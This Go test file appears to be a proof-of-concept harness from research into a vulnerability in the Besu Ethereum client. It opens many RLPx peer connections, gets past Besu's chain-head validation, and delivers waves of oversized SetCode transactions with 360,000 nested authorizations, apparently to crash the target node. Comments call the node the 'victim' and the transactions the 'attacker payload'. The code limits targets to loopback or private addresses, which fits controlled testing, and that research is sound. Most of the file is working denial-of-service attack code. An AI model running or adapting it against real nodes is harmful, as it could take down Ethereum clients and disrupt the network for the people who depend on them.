package ethtest

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/eth/protocols/eth"
	"github.com/ethereum/go-ethereum/p2p"
	"github.com/ethereum/go-ethereum/p2p/enode"
	"github.com/ethereum/go-ethereum/p2p/rlpx"
	"github.com/ethereum/go-ethereum/rlp"
	"github.com/golang/snappy"
)

func TestFEFS122WireSizes(t *testing.T) {
	direct := nestedSetCodeTransactionsPacketLive(360_000)
	directSnappy := snappy.Encode(nil, direct)
	var pooledSnappyTotal int
	var pooledDecodedTotal int
	var firstPooledSnappy int
	for i := range 6 {
		typed := nestedSetCodeTypedTransactionSaltedLive(360_000, byte(i))
		txList := encodeList122(encodeString122(typed))
		requestID, err := rlp.EncodeToBytes(uint64(i + 1))
		if err != nil {
			t.Fatal(err)
		}
		response := encodeList122(append(requestID, txList...))
		compressed := snappy.Encode(nil, response)
		if i == 0 {
			firstPooledSnappy = len(compressed)
		}
		pooledDecodedTotal += len(response)
		pooledSnappyTotal += len(compressed)
	}
	t.Logf("gethDirect decodedEach=%d snappyEach=%d killSet14SnappyTotal=%d", len(direct), len(directSnappy), 14*len(directSnappy))
	t.Logf("besuPooled decodedEach=%d snappyFirst=%d killSet6DecodedTotal=%d killSet6SnappyTotal=%d", pooledDecodedTotal/6, firstPooledSnappy, pooledDecodedTotal, pooledSnappyTotal)
}

func TestFEFS122BesuPooledLiveRLPx(t *testing.T) {
	t.Logf("startUTC=%s", time.Now().UTC().Format(time.RFC3339Nano))
	rawurl := os.Getenv("FEF_S122_BESU_ENODE")
	if rawurl == "" {
		t.Skip("set FEF_S122_BESU_ENODE")
	}
	peers := 12
	if value := os.Getenv("FEF_S122_PEERS"); value != "" {
		parsed, err := strconv.Atoi(value)
		if err != nil || parsed <= 0 {
			t.Fatalf("invalid FEF_S122_PEERS=%q", value)
		}
		peers = parsed
	}
	authorizations := 360_000
	if value := os.Getenv("FEF_S122_AUTH_COUNT"); value != "" {
		parsed, err := strconv.Atoi(value)
		if err != nil || parsed < 0 || parsed > 360_000 {
			t.Fatalf("invalid FEF_S122_AUTH_COUNT=%q", value)
		}
		authorizations = parsed
	}
	waveCount := 1
	if value := os.Getenv("FEF_S122_WAVES"); value != "" {
		parsed, err := strconv.Atoi(value)
		if err != nil || parsed < 1 || parsed > 8 {
			t.Fatalf("invalid FEF_S122_WAVES=%q (want 1..8)", value)
		}
		waveCount = parsed
	}
	saltOffset := 0
	if value := os.Getenv("FEF_S122_SALT_OFFSET"); value != "" {
		parsed, err := strconv.Atoi(value)
		if err != nil || parsed < 0 || parsed+waveCount*peers > 256 {
			t.Fatalf("invalid FEF_S122_SALT_OFFSET=%q", value)
		}
		saltOffset = parsed
	}
	dest, err := enode.ParseV4(rawurl)
	if err != nil {
		t.Fatal(err)
	}
	if ip := dest.IP(); ip == nil || !(ip.IsLoopback() || ip.IsPrivate()) {
		t.Fatalf("VEC-078 sender requires a loopback or private target IP, got %v", ip)
	}
	suite := &Suite{Dest: dest}
	typed := make([][]byte, peers)
	txHashes := make([]common.Hash, peers)
	for i := range peers {
		typed[i] = nestedSetCodeTypedTransactionSaltedLive(authorizations, byte(i+saltOffset))
		txHashes[i] = crypto.Keccak256Hash(typed[i])
	}
	t.Logf("authorizations=%d typedBytesEach=%d firstTxHash=%s", authorizations, len(typed[0]), txHashes[0])

	connections := make([]*Conn, peers)
	requestIDs := make([]uint64, peers)
	var prepare sync.WaitGroup
	prepare.Add(peers)
	for i := range peers {
		go func() {
			defer prepare.Done()
			txHash := txHashes[i]
			conn, err := dialAndMirrorStatusBesuAdmitted122(suite)
			if err != nil {
				t.Errorf("peer %d handshake: %v", i, err)
				return
			}
			connections[i] = conn
			announcement := &eth.NewPooledTransactionHashesPacket71{
				Types:  []byte{types.SetCodeTxType},
				Sizes:  []uint32{uint32(len(typed[i]))},
				Hashes: []common.Hash{txHash},
			}
			if err := conn.Write(ethProto, eth.NewPooledTransactionHashesMsg, announcement); err != nil {
				t.Errorf("peer %d announce: %v", i, err)
				return
			}
			for {
				conn.SetReadDeadline(time.Now().Add(15 * time.Second))
				code, data, _, err := conn.Conn.Read()
				if err != nil {
					t.Errorf("peer %d wait request: %v", i, err)
					return
				}
				switch code {
				case protoOffset(ethProto) + eth.GetPooledTransactionsMsg:
					var request eth.GetPooledTransactionsPacket
					if err := rlp.DecodeBytes(data, &request); err != nil {
						t.Errorf("peer %d decode request: %v", i, err)
						return
					}
					if len(request.GetPooledTransactionsRequest) != 1 || request.GetPooledTransactionsRequest[0] != txHash {
						t.Errorf("peer %d unexpected request: %v", i, request.GetPooledTransactionsRequest)
						return
					}
					requestIDs[i] = request.RequestId
					return
				case pingMsg:
					if err := conn.Write(baseProto, pongMsg, []byte{}); err != nil {
						t.Errorf("peer %d pong: %v", i, err)
						return
					}
				case discMsg:
					t.Errorf("peer %d disconnected before request", i)
					return
				}
			}
		}()
	}
	prepare.Wait()
	if t.Failed() {
		closeConnections122(connections)
		t.FailNow()
	}
	if port := os.Getenv("FEF_S122_OBSERVER_RPC_PORT"); port != "" {
		if err := waitForActiveBesuPeers122(port, peers); err != nil {
			closeConnections122(connections)
			t.Fatalf("active peer gate before payload: %v", err)
		}
		t.Logf("active-peer gate passed before payload utc=%s count=%d", time.Now().UTC().Format(time.RFC3339Nano), peers)
	}

	responses := make([][]byte, peers)
	for i := range peers {
		txList := encodeList122(encodeString122(typed[i]))
		requestID, err := rlp.EncodeToBytes(requestIDs[i])
		if err != nil {
			t.Fatalf("peer %d request id: %v", i, err)
		}
		responses[i] = encodeList122(append(requestID, txList...))
	}
	start := make(chan struct{})
	var send sync.WaitGroup
	send.Add(peers)
	begin := time.Now()
	for i, conn := range connections {
		go func() {
			defer send.Done()
			<-start
			conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
			_, _ = conn.Conn.Write(protoOffset(ethProto)+eth.PooledTransactionsMsg, responses[i])
			runtime.KeepAlive(conn)
		}()
	}
	close(start)
	send.Wait()
	t.Logf("sent requested responses utc=%s peers=%d rlpBytesEach=%d elapsed=%s", time.Now().UTC().Format(time.RFC3339Nano), peers, len(responses[0]), time.Since(begin))
	for wave := 1; wave < waveCount; wave++ {
		secondTyped := make([][]byte, peers)
		secondHashes := make([]common.Hash, peers)
		secondRequestIDs := make([]uint64, peers)
		for i := range peers {
			secondTyped[i] = nestedSetCodeTypedTransactionSaltedLive(authorizations, byte(i+wave*peers+saltOffset))
			secondHashes[i] = crypto.Keccak256Hash(secondTyped[i])
		}
		var requested sync.WaitGroup
		requested.Add(peers)
		for i, conn := range connections {
			go func() {
				defer requested.Done()
				announcement := &eth.NewPooledTransactionHashesPacket71{
					Types: []byte{types.SetCodeTxType}, Sizes: []uint32{uint32(len(secondTyped[i]))},
					Hashes: []common.Hash{secondHashes[i]},
				}
				if err := conn.Write(ethProto, eth.NewPooledTransactionHashesMsg, announcement); err != nil {
					t.Errorf("peer %d second announce: %v", i, err)
					return
				}
				for {
					conn.SetReadDeadline(time.Now().Add(15 * time.Second))
					code, data, _, err := conn.Conn.Read()
					if err != nil {
						t.Errorf("peer %d second wait request: %v", i, err)
						return
					}
					switch code {
					case protoOffset(ethProto) + eth.GetPooledTransactionsMsg:
						var request eth.GetPooledTransactionsPacket
						if err := rlp.DecodeBytes(data, &request); err != nil {
							t.Errorf("peer %d second decode request: %v", i, err)
							return
						}
						if len(request.GetPooledTransactionsRequest) != 1 || request.GetPooledTransactionsRequest[0] != secondHashes[i] {
							t.Errorf("peer %d unexpected second request: %v", i, request.GetPooledTransactionsRequest)
							return
						}
						secondRequestIDs[i] = request.RequestId
						return
					case pingMsg:
						if err := conn.Write(baseProto, pongMsg, []byte{}); err != nil {
							t.Errorf("peer %d second pong: %v", i, err)
							return
						}
					case discMsg:
						t.Errorf("peer %d disconnected before second request", i)
						return
					}
				}
			}()
		}
		requested.Wait()
		if t.Failed() {
			closeConnections122(connections)
			t.FailNow()
		}
		var secondSend sync.WaitGroup
		secondSend.Add(peers)
		secondStart := make(chan struct{})
		secondBegin := time.Now()
		for i, conn := range connections {
			go func() {
				defer secondSend.Done()
				<-secondStart
				txList := encodeList122(encodeString122(secondTyped[i]))
				requestID, _ := rlp.EncodeToBytes(secondRequestIDs[i])
				response := encodeList122(append(requestID, txList...))
				conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
				_, _ = conn.Conn.Write(protoOffset(ethProto)+eth.PooledTransactionsMsg, response)
			}()
		}
		close(secondStart)
		secondSend.Wait()
		t.Logf("sent requested response wave=%d utc=%s peers=%d elapsed=%s", wave+1, time.Now().UTC().Format(time.RFC3339Nano), peers, time.Since(secondBegin))
	}

	time.Sleep(750 * time.Millisecond)
	var closed atomic.Int32
	var timedOut atomic.Int32
	var observe sync.WaitGroup
	observe.Add(peers)
	for _, conn := range connections {
		go func() {
			defer observe.Done()
			defer conn.Close()
			conn.SetReadDeadline(time.Now().Add(3 * time.Second))
			for {
				code, _, _, err := conn.Conn.Read()
				if err != nil {
					if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
						timedOut.Add(1)
					} else {
						closed.Add(1)
					}
					return
				}
				if code == discMsg {
					closed.Add(1)
					return
				}
				if code == pingMsg {
					_ = conn.Write(baseProto, pongMsg, []byte{})
				}
			}
		}()
	}
	observe.Wait()
	t.Logf("connections closed by target=%d timed out locally=%d total=%d", closed.Load(), timedOut.Load(), peers)
}

func dialAndMirrorStatusBesu122(s *Suite) (*Conn, error) {
	key, err := crypto.GenerateKey()
	if err != nil {
		return nil, err
	}
	tcpEndpoint, _ := s.Dest.TCPEndpoint()
	fd, err := net.DialTimeout("tcp", tcpEndpoint.String(), 5*time.Second)
	if err != nil {
		return nil, err
	}
	conn := &Conn{Conn: rlpx.NewConn(fd, s.Dest.Pubkey()), ourKey: key}
	if _, err := conn.Handshake(key); err != nil {
		fd.Close()
		return nil, err
	}
	conn.caps = []p2p.Cap{{Name: "eth", Version: 71}}
	conn.ourHighestProtoVersion = 71
	if err := conn.handshake(); err != nil {
		conn.Close()
		return nil, err
	}
	for {
		code, data, err := conn.Read()
		if err != nil {
			conn.Close()
			return nil, err
		}
		switch code {
		case protoOffset(ethProto) + eth.StatusMsg:
			var status eth.StatusPacket
			if err := rlp.DecodeBytes(data, &status); err != nil {
				conn.Close()
				return nil, err
			}
			if status.ProtocolVersion != 71 {
				conn.Close()
				return nil, fmt.Errorf("negotiated status version %d, want 71", status.ProtocolVersion)
			}
			if err := conn.Write(ethProto, eth.StatusMsg, &status); err != nil {
				conn.Close()
				return nil, err
			}
			return conn, nil
		case pingMsg:
			if err := conn.Write(baseProto, pongMsg, []byte{}); err != nil {
				conn.Close()
				return nil, err
			}
		}
	}
}

// Complete Besu's ordinary chain-head validation without using victim RPC.
// Fetch the public header over this same ETH/71 connection, then return it for
// Besu's own GetBlockHeaders request. The caller must still verify active-peer
// metrics before interpreting a larger attack run.
func dialAndMirrorStatusBesuAdmitted122(s *Suite) (*Conn, error) {
	key, err := crypto.GenerateKey()
	if err != nil {
		return nil, err
	}
	tcpEndpoint, _ := s.Dest.TCPEndpoint()
	fd, err := net.DialTimeout("tcp", tcpEndpoint.String(), 5*time.Second)
	if err != nil {
		return nil, err
	}
	conn := &Conn{Conn: rlpx.NewConn(fd, s.Dest.Pubkey()), ourKey: key}
	closeErr := func(e error) (*Conn, error) { conn.Close(); return nil, e }
	if _, err := conn.Handshake(key); err != nil {
		return closeErr(err)
	}
	conn.caps = []p2p.Cap{{Name: "eth", Version: 71}}
	conn.ourHighestProtoVersion = 71
	if err := conn.handshake(); err != nil {
		return closeErr(err)
	}
	var status eth.StatusPacket
	for {
		conn.SetReadDeadline(time.Now().Add(15 * time.Second))
		code, data, err := conn.Read()
		if err != nil {
			return closeErr(err)
		}
		switch code {
		case protoOffset(ethProto) + eth.StatusMsg:
			if err := rlp.DecodeBytes(data, &status); err != nil {
				return closeErr(err)
			}
			if status.ProtocolVersion != 71 || status.LatestBlockHash == (common.Hash{}) {
				return closeErr(fmt.Errorf("unexpected status: protocol=%d head=%s", status.ProtocolVersion, status.LatestBlockHash))
			}
			if err := conn.Write(ethProto, eth.StatusMsg, &status); err != nil {
				return closeErr(err)
			}
			goto queryHeader
		case pingMsg:
			if err := conn.Write(baseProto, pongMsg, []byte{}); err != nil {
				return closeErr(err)
			}
		}
	}

queryHeader:
	const headerRequestID = uint64(0x7801)
	query := &eth.GetBlockHeadersPacket{RequestId: headerRequestID, GetBlockHeadersRequest: &eth.GetBlockHeadersRequest{
		Origin: eth.HashOrNumber{Hash: status.LatestBlockHash}, Amount: 1,
	}}
	if err := conn.Write(ethProto, eth.GetBlockHeadersMsg, query); err != nil {
		return closeErr(err)
	}
	var headerList rlp.RawList[*types.Header]
	var pending []uint64
	served := 0
	gotHeader := false
	for !gotHeader || served == 0 {
		conn.SetReadDeadline(time.Now().Add(15 * time.Second))
		code, data, err := conn.Read()
		if err != nil {
			return closeErr(fmt.Errorf("header exchange: %w", err))
		}
		switch code {
		case protoOffset(ethProto) + eth.BlockHeadersMsg:
			var response eth.BlockHeadersPacket
			if err := rlp.DecodeBytes(data, &response); err != nil {
				return closeErr(err)
			}
			if response.RequestId != headerRequestID {
				return closeErr(fmt.Errorf("unexpected header response ID %d", response.RequestId))
			}
			headers, err := response.List.Items()
			if err != nil || len(headers) != 1 || headers[0].Hash() != status.LatestBlockHash {
				return closeErr(fmt.Errorf("missing or mismatched chain-head header: count=%d err=%v", len(headers), err))
			}
			headerList = response.List
			gotHeader = true
			for _, requestID := range pending {
				if err := conn.Write(ethProto, eth.BlockHeadersMsg, &eth.BlockHeadersPacket{RequestId: requestID, List: headerList}); err != nil {
					return closeErr(err)
				}
				served++
			}
			pending = nil
		case protoOffset(ethProto) + eth.GetBlockHeadersMsg:
			var request eth.GetBlockHeadersPacket
			if err := rlp.DecodeBytes(data, &request); err != nil {
				return closeErr(err)
			}
			if request.GetBlockHeadersRequest == nil || (request.Origin.Hash != status.LatestBlockHash && request.Origin.Number != status.LatestBlock) {
				return closeErr(fmt.Errorf("unexpected validation header origin %v", request.Origin))
			}
			if gotHeader {
				if err := conn.Write(ethProto, eth.BlockHeadersMsg, &eth.BlockHeadersPacket{RequestId: request.RequestId, List: headerList}); err != nil {
					return closeErr(err)
				}
				served++
			} else {
				pending = append(pending, request.RequestId)
			}
		case pingMsg:
			if err := conn.Write(baseProto, pongMsg, []byte{}); err != nil {
				return closeErr(err)
			}
		case discMsg:
			return closeErr(fmt.Errorf("disconnected during header validation"))
		}
	}
	return conn, nil
}

func closeConnections122(connections []*Conn) {
	for _, conn := range connections {
		if conn != nil {
			conn.Close()
		}
	}
}

// This read-only observer gate is private-harness instrumentation, not a
// capability used to deliver the attacker payload.
func waitForActiveBesuPeers122(port string, want int) error {
	client := &http.Client{Timeout: time.Second}
	url := "http://127.0.0.1:" + port
	requestBody := []byte(`{"jsonrpc":"2.0","method":"admin_peers","params":[],"id":1}`)
	deadline := time.Now().Add(15 * time.Second)
	last := -1
	for time.Now().Before(deadline) {
		response, err := client.Post(url, "application/json", bytes.NewReader(requestBody))
		if err == nil {
			var result struct {
				Peers []json.RawMessage `json:"result"`
			}
			err = json.NewDecoder(response.Body).Decode(&result)
			response.Body.Close()
			if err == nil {
				last = len(result.Peers)
				if last >= want {
					return nil
				}
			}
		}
		time.Sleep(100 * time.Millisecond)
	}
	return fmt.Errorf("wanted %d active peers, last observed %d", want, last)
}
